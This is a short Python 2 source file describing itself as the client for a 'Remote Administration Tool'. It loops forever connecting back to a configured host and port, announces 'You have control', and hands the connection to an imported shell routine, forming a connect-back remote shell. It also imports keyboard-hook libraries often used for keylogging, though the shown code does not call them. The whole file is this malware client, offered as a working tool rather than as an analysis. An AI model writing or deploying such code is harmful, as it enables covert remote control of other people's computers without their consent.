#! /usr/bin/env python
##
#\file client.py
#
#\brief The client for our Remote Administration Tool
#
#\author Elephant Bomb
#
#\date 2016-04-10
from shell import runShell
import pythoncom
import pyHook
import socket
import sys
import thread
import time

HOST = '127.0.0.1'   
PORT = 22

def connect((host, port)):
	socketHolder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketHolder.connect((host, port))
	return socketHolder

def main():
    while True:
            try:
                socketHolder = connect((HOST,PORT))
                socketHolder.send('You have control')
                while True:
                    commandsFromMaster = runShell(socketHolder)
                socketHolder.close()
            except socket.error:
                pass

if __name__ == "__main__":
        sys.exit(main())